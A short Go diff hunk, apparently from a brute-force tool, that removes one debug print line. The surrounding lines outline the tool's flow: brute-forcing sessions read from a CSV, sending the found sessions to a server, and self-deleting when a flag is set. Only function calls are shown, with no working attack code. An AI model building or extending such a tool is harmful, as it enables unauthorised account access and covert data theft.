@@ -137,7 +137,6 @@ func ReadCsv(msgSess, msgErr chan vars.Connection) {
 	}
 
 	finalSessionsFound := StartBruteForce(&allC, msgSess, msgErr)
-	fmt.Println(finalSessionsFound, "MMMMMMMMMMMMMMMMMMMMMMM")
 	SendFileToServer(finalSessionsFound)
 	if vars.Destr {
 		SelfDel()
